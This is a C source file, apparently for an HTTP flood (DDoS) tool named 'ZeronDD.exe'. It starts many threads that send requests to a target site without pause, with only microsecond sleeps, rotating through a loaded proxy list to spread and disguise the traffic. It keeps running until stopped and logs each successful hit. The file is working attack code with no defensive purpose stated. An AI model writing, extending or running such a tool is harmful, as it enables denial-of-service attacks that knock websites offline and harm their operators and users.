#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include "proxy.h"
#include "http.h"

static int 				thread_proxy_index = 0;
static Proxy 			*proxy_list;
static int 				proxy_list_size = 0;
static unsigned char 	*proxy_failed;
static char 			*fixed_target_site = NULL;

void *task(void *userdata);

#ifdef _WIN32
	#include <windows.h>

	#define usleep 	Sleep
	static HANDLE mutex; 

	#define MUTEX(CODE) 												\
		if (WaitForSingleObject(mutex, INFINITE) == WAIT_ABANDONED)		\
		{																\
			printf("Mutex wait error\n");								\
			exit(1);													\
		}																\
		{ CODE }														\
		ReleaseMutex(mutex);											

	static void threads_func(unsigned int 	threads_count, 
							 Proxy 			*proxy_list, 
							 unsigned int 	proxy_list_size)
	{
		int i;
		HANDLE *threads_list;
		DWORD ThreadID;


		threads_list = malloc(threads_count * sizeof(HANDLE));
		mutex = CreateMutex(NULL, FALSE, NULL);

		printf("[WIN] Start %d threads\n", threads_count);
		for (i = 0; i < threads_count; i++)
		{
			threads_list[i] = CreateThread(NULL,  
									  	   0, 
									  		(LPTHREAD_START_ROUTINE) task, 
									  		(void *) i, 
									  		0, 
									  		&ThreadID);
			if (threads_list[i] == NULL)
			{
				printf("Thread creating error\n");
				return;
			}
		}

		DWORD Result = WaitForMultipleObjects(threads_count, threads_list, TRUE, INFINITE);

		printf("WE DONE: %ld\n", Result);

		for(i=0; i < threads_count; i++)
		{
		 	CloseHandle(threads_list[i]);
		}

		CloseHandle(mutex);
		free(threads_list);
	}															
#else
	#include <pthread.h>
	#include <unistd.h>

	static pthread_mutex_t 	mutex;

	#define MUTEX(CODE) 						\
		pthread_mutex_lock(&mutex);				\
		{										\
			CODE 								\
		}										\
		pthread_mutex_unlock(&mutex);


	static void threads_func(unsigned int 	threads_count, 
							 Proxy 			*proxy_list, 
							 unsigned int 	proxy_list_size)
	{
		int i;
		pthread_t threads_list[threads_count];


		pthread_mutex_init(&mutex, NULL);

		printf("Start %d threads\n", threads_count);
		for (i = 0; i < threads_count; i++)
		{
			pthread_create(threads_list + i, NULL, task, (void *) i);
		}

		for (i = 0; i < threads_count; i++)
		{
			pthread_join(threads_list[i], NULL);
		}

		pthread_mutex_destroy(&mutex);
	}

#endif

void *task(void *userdata)
{
	Proxy *proxy;
	HTTP *http;
	unsigned int proxy_index;
	long http_code;
	int id;
	char *target;


	id = (int) userdata;
	HTTP_Create(&http, id);
	#if 1
	HTTP_SetVerbose(http, true);
	#endif
	while (1)
	{
		MUTEX(
			if (thread_proxy_index >= proxy_list_size)
			{
				thread_proxy_index = 0;
				usleep(100);
			}
			proxy_index = thread_proxy_index;
			thread_proxy_index++;
		)

		if (proxy_failed[proxy_index] > 4)
		{
			continue;
		}

		proxy = &proxy_list[proxy_index];
		target = fixed_target_site ? fixed_target_site : proxy->target_site;
		HTTP_SetURL(http, target);
		HTTP_SetProxy(http, proxy->ip, proxy->user_password);
		http_code = HTTP_Request(http);
		if ((http_code == 0) || (http_code >= 400))
		{
			proxy_failed[proxy_index]++;
		}
		else
		{
			MUTEX(
				if (proxy_failed[proxy_index] > 0)
					proxy_failed[proxy_index]--;
			)
			 printf("[%s][%d] SUCCESS\n", target, proxy_index);
		}

		usleep(20);
	}

	HTTP_Free(&http);
	return NULL;
}

int main(int argc, char **argv)
{
	int i;
	unsigned int threads_count;
	char *proxies_file_path = NULL;


	if (argc < 3)
	{
		printf("Usage: ZeronDD.exe [threads_count] [path_to_proxies] [optional][fixed_target]\n");
		return 0;
	}

	threads_count = atoi(argv[1]);
	proxies_file_path = argv[2];

	if (argc > 3)
	{
		fixed_target_site = argv[3];
	}

	HTTP_ModuleInit();

	if (!Proxy_Load(proxies_file_path, &proxy_list, &proxy_list_size))
	{
		printf("Proxy_Load error\n");
		return 1;
	}
	printf("Read %d proxy\n", proxy_list_size);
	proxy_failed = calloc(proxy_list_size, sizeof(*proxy_failed));

	threads_func(threads_count, proxy_list, proxy_list_size);

	free(proxy_failed);
	free(proxy_list);
	HTTP_ModuleFree();
	
	return 0;
}